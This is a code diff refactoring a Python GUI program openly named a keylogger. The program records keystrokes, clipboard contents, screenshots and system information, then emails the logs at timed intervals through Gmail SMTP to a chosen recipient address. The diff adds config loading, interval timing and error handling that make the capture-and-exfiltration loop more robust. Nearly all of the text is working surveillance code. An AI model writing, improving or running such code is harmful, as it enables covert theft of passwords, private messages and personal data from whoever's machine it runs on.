@@ -26,22 +26,104 @@ from pynput.keyboard import Listener
 import glob
 from datetime import datetime
 
+import json
+import time
+
+_DEFAULT_CONFIG = {
+    "paths": {
+    "data_dir": "app/data",
+    "keys_file": "app/data/key_log.txt",
+    "system_file": "app/data/systeminfo.txt",
+    "clipboard_file": "app/data/clipboard.txt",
+    "screenshot_dir": "app/data/screenshots"
+    }
+,
+    "intervals_seconds": {
+        "screenshot_interval": 900,
+        "email_interval": 900,
+        "clipboard_interval": 30,
+        "loop_sleep": 1
+    },
+    "screenshots": {"keep_latest": 10},
+    "email": {
+        "smtp_host": "smtp.gmail.com",
+        "smtp_port": 587,
+        "from_env": True,
+        "from_address_env_var": "email",
+        "from_password_env_var": "pass"
+    },
+    "gui": {
+        "icon": "cracking.ico",
+        "image": "cracking.png",
+        "window_title": "Key Logger 5155"
+    },
+    "safety": {"require_confirm": True}
+}
+
+def load_config():
+    """Load ../config.json relative to this file, merge with defaults."""
+    base_dir = os.path.dirname(os.path.abspath(__file__))
+    config_path = os.path.join(base_dir, "..", "config.json")
+    cfg = _DEFAULT_CONFIG.copy()
+
+    try:
+        with open(config_path, "r", encoding="utf-8") as f:
+            user_cfg = json.load(f)
+    except FileNotFoundError:
+        logging.warning(f"config.json not found at {config_path}, using defaults")
+        return cfg
+    except json.JSONDecodeError as e:
+        logging.error(f"Invalid config.json: {e}")
+        return cfg
+
+    for top_key, top_val in user_cfg.items():
+        if top_key in cfg and isinstance(cfg[top_key], dict) and isinstance(top_val, dict):
+            cfg[top_key].update(top_val)
+        else:
+            cfg[top_key] = top_val
+    return cfg
+
+# Load config once
+config = load_config()
+
+
 # Load environment variables
 load_dotenv()
 
 # Configure logging
-logging.basicConfig(filename="data/key_log.txt", level=logging.DEBUG, format='%(asctime)s, %(message)s')
+logging.basicConfig(
+    filename=os.path.join(os.path.dirname(__file__), "data", "key_log.txt"),
+    level=logging.DEBUG,
+    format="%(asctime)s, %(message)s"
+)
 
 # File paths for various log files
-keys_information = "data/key_log.txt"
-system_information = "data/systeminfo.txt"
-clipboard_information = "data/clipboard.txt"
-SCREENSHOT_DIR="data/screenshots"
+# Config-based paths and intervals
+paths = config["paths"]
+keys_information = paths["keys_file"]
+system_information = paths["system_file"]
+clipboard_information = paths["clipboard_file"]
+SCREENSHOT_DIR = paths["screenshot_dir"]
 
-DATA_DIR = "data"
-SCREENSHOTS_DIR = os.path.join(DATA_DIR, "screenshots")
-STATE_FILE = os.path.join(DATA_DIR, "last_email_state.json")
-KEYLOG_EXTRA_BYTES = 2048
+intervals = config["intervals_seconds"]
+SCREENSHOT_INTERVAL = int(intervals.get("screenshot_interval", 900))
+EMAIL_INTERVAL = int(intervals.get("email_interval", 900))
+CLIPBOARD_INTERVAL = int(intervals.get("clipboard_interval", 30))
+LOOP_SLEEP = float(intervals.get("loop_sleep", 1.0))
+
+KEEP_SCREENSHOTS = int(config.get("screenshots", {}).get("keep_latest", 10))
+
+email_cfg = config["email"]
+SMTP_HOST = email_cfg.get("smtp_host", "smtp.gmail.com")
+SMTP_PORT = int(email_cfg.get("smtp_port", 587))
+
+# Load email credentials (prefer env)
+if email_cfg.get("from_env", True):
+    email_address = os.getenv(email_cfg.get("from_address_env_var", "email"))
+    password = os.getenv(email_cfg.get("from_password_env_var", "pass"))
+else:
+    email_address = email_cfg.get("from_address")
+    password = email_cfg.get("from_password")
 
 # Retrieve email and password from environment variables
 email_address = os.getenv('email')
@@ -309,31 +391,52 @@ listener = Listener(on_press=on_press)
 
 # Function to start keylogger
 def start_logger():
-    global listener, toAddr, btnStr
-    count = 900
+    global listener, toAddr, btnStr, stopFlag
     listener.start()
     btnStr.set("Stop Keylogger")
+
     screenshot()
+    last_screenshot = time.time()
+    last_clipboard = time.time()
+    last_email = time.time()
+
     while True:
-        print(count)
         if stopFlag:
             break
-        if count % 30 ==0 :
-            copy_clipboard()
-        if count == 0:
-            screenshot()
-            computer_information()
-            if email_address and password and toAddr != "":
+
+        now = time.time()
+
+        # Clipboard capture
+        if now - last_clipboard >= CLIPBOARD_INTERVAL:
+            try:
+                copy_clipboard()
+            except Exception as e:
+                logging.error(f"Clipboard error: {e}")
+            last_clipboard = now
+
+        # Screenshot capture
+        if now - last_screenshot >= SCREENSHOT_INTERVAL:
+            try:
+                screenshot()
+            except Exception as e:
+                logging.error(f"Screenshot error: {e}")
+            last_screenshot = now
+
+        # Email send
+        if now - last_email >= EMAIL_INTERVAL:
+            if email_address and password and toAddr:
                 try:
                     send_email(keys_information, keys_information, toAddr)
-                except:
-                    pass
-            count = 900
-        sleep(1)
-        count -= 1
+                except Exception as e:
+                    logging.error(f"Email send failed: {e}")
+            last_email = now
+
+        time.sleep(LOOP_SLEEP)
+
     listener.stop()
     btnStr.set("Start Keylogger")
     listener = Listener(on_press=on_press)
+
 
 
 # Function to handle button click event
@@ -378,10 +481,15 @@ btnStr = StringVar()
 btnStr.set("Start Keylogger")
 
 # Load and set icon on Title bar
-root.after(201, lambda: root.iconbitmap('cracking.ico'))
+base_dir = os.path.dirname(os.path.abspath(__file__))
+icon_path = os.path.join(base_dir, "data", "cracking.ico")
+img_path = os.path.join(os.path.dirname(__file__), "cracking.png")
+image = Image.open(img_path)
 
-# Display an image
-image = Image.open('cracking.png')
+icon_path = os.path.join(os.path.dirname(__file__), "cracking.ico")
+root.after(201, lambda: root.iconbitmap(icon_path))
+image = Image.open(img_path)
+
 resize_image = image.resize((300, 300))
 img = CTkImage(light_image=resize_image, size=(240, 240))
 icon = CTkLabel(main_frame, image=img, text="")
